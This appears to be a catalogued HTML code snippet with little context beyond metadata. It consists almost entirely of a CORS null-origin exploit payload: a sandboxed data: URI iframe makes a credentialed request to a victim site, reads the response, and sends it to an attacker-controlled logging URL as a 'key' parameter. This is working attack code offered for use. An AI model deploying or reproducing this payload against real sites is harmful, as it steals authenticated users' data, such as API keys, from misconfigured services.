---
id: d2f96c84-406b-468c-a173-ac4e6d4873fe
type: code
language: HTML
verified: false
created_at: '2023-04-06T03:55:54.263684+00:00'
updated_at: '2023-04-06T03:55:54.267976+00:00'
---

# Code Snippet d2f96c84

**Language**: HTML

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```


